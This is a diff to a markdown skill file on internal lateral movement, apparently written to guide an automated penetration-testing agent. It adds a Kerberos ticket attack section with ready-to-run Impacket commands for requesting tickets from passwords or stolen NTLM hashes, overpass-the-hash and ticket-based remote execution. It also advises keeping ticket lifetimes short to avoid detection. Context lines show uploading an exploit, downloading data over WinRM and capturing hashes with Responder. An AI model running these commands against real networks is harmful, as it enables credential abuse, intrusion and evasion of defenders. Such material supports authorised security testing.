@@ -1,6 +1,6 @@
 ---
 name: lateral_movement
-description: Internal lateral movement — SSH key reuse, password spraying, Pass-the-Hash, remote execution (NetExec/Impacket/WinRM), poisoning (responder), cloud credential abuse. Includes decision matrix for tool selection.
+description: Internal lateral movement — SSH key reuse, password spraying, Pass-the-Hash, Kerberos ticket attacks (PtT/overpass-the-hash), remote execution (NetExec/Impacket/WinRM), poisoning (responder), cloud credential abuse. Includes decision matrix for tool selection.
 ---
 
 # Lateral Movement
@@ -119,9 +119,39 @@ upload /tmp/exploit.exe
 download C:\temp\data.txt /workspace/output/
 ```
 
+## Kerberos Ticket Attacks
+
+Use when you hold a password, NTLM hash, or AES key for a domain account —
+request and reuse tickets instead of replaying the raw secret:
+
+```bash
+# Request a TGT with a password (or -hashes :NTLM / -aesKey KEY)
+impacket-getTGT corp.local/user:password
+export KRB5CCNAME=user.ccache
+
+# Overpass-the-hash: TGT from an NTLM hash, then authenticate with the ticket
+impacket-getTGT -dc-ip 10.0.0.1 -hashes :<NTLM> corp.local/user
+
+# Use the ticket for remote execution (no password sent to the target)
+export KRB5CCNAME=/workspace/output/user.ccache && impacket-wmiexec -k -no-pass corp.local/user@ws01.corp.local
+klist  # verify which tickets you hold and their expiry
+
+# Convert between Windows .kirbi and Unix .ccache when moving between tools
+impacket-ticketConverter ticket.kirbi ticket.ccache
+
+# Renewal: tickets expire; re-request from the hash rather than saving the
+# TGT indefinitely (10-year golden-style tickets stand out — keep lifetimes short)
+```
+
+Kerberos flows need name resolution and time sync with the DC (`ntpdate`,
+`/etc/krb5.conf` or `-dc-ip`). For certificate-based access (ADCS), shadow
+credentials and delegation abuse, see `technologies/active_directory`; for
+relay and coercion see `internal/relay_and_coercion`.
+
 ## Name Resolution Poisoning (Responder)
 
-Use when you have a foothold on the same L2 segment as other Windows hosts:
+Use when you have a foothold on the same L2 segment as other Windows hosts
+(relay instead of crack: `internal/relay_and_coercion`):
 
 ```bash
 # Start responder (captures NTLMv2 hashes)
